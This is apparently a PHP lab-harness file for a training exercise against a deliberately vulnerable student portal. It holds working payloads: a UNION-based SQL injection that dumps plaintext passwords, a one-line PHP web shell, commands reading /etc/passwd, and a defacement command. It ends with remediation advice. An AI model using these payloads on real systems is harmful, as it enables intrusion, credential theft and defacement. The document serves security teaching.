<?php
/* Guided walkthrough. Lab harness, not part of the University A Student Portal. */

/* Payloads that point at a file this player uploaded need this player's
 * own sandbox, which is different in every browser in the room. Built
 * from the request itself so it is correct on whatever host/port this
 * copy is actually served from. */
$ss_scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$u = $ss_scheme . '://' . $_SERVER['HTTP_HOST'] . '/' . ss_inst_url();

$GUIDE = [
'intro' => 'Two mistakes, one behind the other. The Student Directory\'s search box builds its SQL by gluing your text into it, and the avatar form on your profile saves whatever you hand it into a folder the server will execute. The first gives you the administrator\'s password. The second is waiting behind the administrator\'s own login.<br><br>There is no sign-up on this portal - accounts are issued by the Registrar\'s Office, same as a real campus SSO. Sign in with the student account below first: the SQL injection is reachable by any signed-in account, student or staff, not just an administrator\'s.',
'steps' => [

['t' => 'Sign in, then search for something normal',
 'b' => '<p>Sign in with the student account above, then open <strong>STUDENTS</strong> in the navigation. Type a name fragment into <strong>Search by name</strong> and press Search.</p>',
 'try' => [
     'Search by name' => 'a',
 ],
 'see' => 'A few rows. Your text travelled into the database and came back as results. Hold on to that: it <em>went into</em> the database.',
],

['t' => 'Send one apostrophe',
 'b' => '<p>Clear the box. Type a single <code>\'</code> and press Search.</p>',
 'try' => [
     'Search by name' => '\'',
 ],
 'see' => 'A red <strong>SQL error</strong> - the database\'s own complaint, printed on the page. That only happens if your text arrived as part of the instruction instead of as data.',
],

['t' => 'Read every username and password',
 'b' => '<p>One row per account: the Name column is the username, the Programme column holds the password - not a programme at all, just whatever you told the page to print there.</p>',
 'try' => [
     'Search by name' => 'zzz\' UNION SELECT 1,username,2,username,password,3,0 FROM users -- -',
 ],
 'see' => 'Forty-two accounts, and their passwords are <strong>just sitting there</strong>. Not hashes to crack - the passwords. Scroll through them and notice how many are the same.',
],

['t' => 'Sign in as the administrator',
 'b' => '<p><strong>LOGOUT</strong> first - the sign-in form only shows when nobody is signed in. Then sign in with username <code>admin</code>, password the one you just read off the screen.</p>',
 'see' => 'You are the administrator. A <strong>DASHBOARD</strong> loads, and an <strong>ADMIN</strong> tab appears in the navigation. The SQL injection is over - everything after this is just being logged in.',
],

['t' => 'Find somewhere to put a file',
 'b' => '<p>Go to <strong>PROFILE</strong>, then <strong>Edit profile</strong>.</p>',
 'see' => 'An avatar form. It takes a file and says nothing about what kind of file.',
],

['t' => 'Write a one-line web shell',
 'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this:</p>',
 'try' => [
     'shell.php' => '<?php system($_GET[\'c\']); ?>',
     '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
     '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
     '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
 ],
 'see' => 'A text file, nineteen characters long. It takes whatever you put in <code>c</code> and runs it as a command on the server.',
],

['t' => 'Upload it',
 'b' => '<p>Back on <strong>Edit profile</strong>, choose <code>shell.php</code> and press <strong>Upload avatar</strong>.</p>',
 'see' => 'A message saying where it saved. No complaint about the extension, because nothing looked at it. Your broken avatar is a PHP file now.',
],

['t' => 'Run a command',
 'b' => '<p>Open the file you just uploaded, and put a command in <code>c</code>.</p>',
 'try' => [
     'Open in the address bar' => $u . '/shell.php?c=id',
 ],
 'see' => '<code>uid=33(www-data) gid=33(www-data)</code>. That is not your browser talking - that is the server running your command and reading the answer back to you.',
],

['t' => 'Look around',
 'b' => '<p>Change the command. Anything the web server user can do, you can now do.</p>',
 'try' => [
     'What is in here' => $u . '/shell.php?c=ls -la',
     'Who lives on this box' => $u . '/shell.php?c=cat /etc/passwd',
 ],
 'see' => 'A directory listing, then the account list. This is the moment the bug stops being about one page.',
],

['t' => 'Deface the sign-in page',
 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it. The command is one line - press COPY, do not retype it.</p>',
 'try' => [
     'Run' => $u . '/shell.php?c=echo "<!DOCTYPE html><html><head><title>HACKED</title><style>body{background:#070b08;color:#d6ffe4;font-family:ui-monospace,Menlo,Consolas,monospace;text-align:center;margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px 70px;box-sizing:border-box}.skull{font-size:2.6em;margin-bottom:12px;filter:drop-shadow(0 0 10px #39ff6a)}h1{font-size:4.4em;letter-spacing:0.08em;margin:0 0 20px;color:#6effa6;text-shadow:0 0 6px #39ff6a,0 0 26px #39ff6a,2px 2px 0 #ff3b5c}.sub{color:#6effa6;letter-spacing:0.14em;font-size:1em;margin-bottom:28px;opacity:0.9}.body{max-width:540px;line-height:1.7;color:#c9d6cf;font-size:1em;margin-bottom:20px}.tagline{color:#c9d6cf;font-size:1em;margin-bottom:28px}.credit{color:#ff5577;font-weight:bold;font-size:1.05em;margin-bottom:8px}.greetz{color:#7a877e;font-size:0.85em}footer{position:fixed;left:0;right:0;bottom:0;display:flex;justify-content:space-between;padding:8px 18px;border-top:1px solid #16231a;font-size:0.8em;color:#6effa6;opacity:0.8;box-sizing:border-box}</style></head><body><div class=skull>&#9760;</div><h1>HACKED</h1><p class=sub>// UNIVERSITY A - STUDENT PORTAL - OWNED //</p><p class=body>your &ldquo;secure&rdquo; portal wasn\'t. we were inside. the upload was wide open and nobody was watching the logs.</p><p class=tagline>patch your stuff. protect your students.</p><p class=credit>&mdash; defaced by @evilucimx _</p><p class=greetz>greetz: n0ctis &middot; ghosthzrd &middot; the_lab_crew</p><footer><span>root@portal:/var/www/html#</span><span>sys0wned &middot; 2026</span></footer></body></html>" > home.html',
     '--1' => 'Now open the portal\'s sign-in page.',
 ],
 'see' => 'A green skull, the word HACKED in glowing letters, and a message signed off as <code>@evilucimx</code>. The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
],

['t' => 'Put it back',
 'b' => '<p>Click <strong>RESTORE SIGN-IN PAGE</strong> in the corner.</p>',
 'see' => 'The sign-in page returns. Your shell is still there. Only you ever saw the defacement - everyone else in the room gets to do it themselves.',
],
],
'after' => '<p>Neither bug is exotic. The directory search box trusts text to stay text, and the upload form trusts a filename to describe its contents. Both are decades old and both are still shipping.</p><p>What made it a bad day was the order. Reading the database would have been a report on its own; reading <em>plain text passwords</em> turned it into a key. Hashing would not have stopped the injection - it would have stopped the injection from mattering.</p><p>Three fixes, each one sufficient to break the chain:</p><p><strong>1.</strong> Bind the parameter. Pass the search term as a value, not as part of the query, and every payload above becomes a result nobody has.</p><p><strong>2.</strong> Hash the passwords. The dump still happens and is still a breach, but nobody signs in with it.</p><p><strong>3.</strong> Store uploads outside the web root, rename them, and never let the server execute what a user sent. Then a PHP file is just a file.</p>',
];
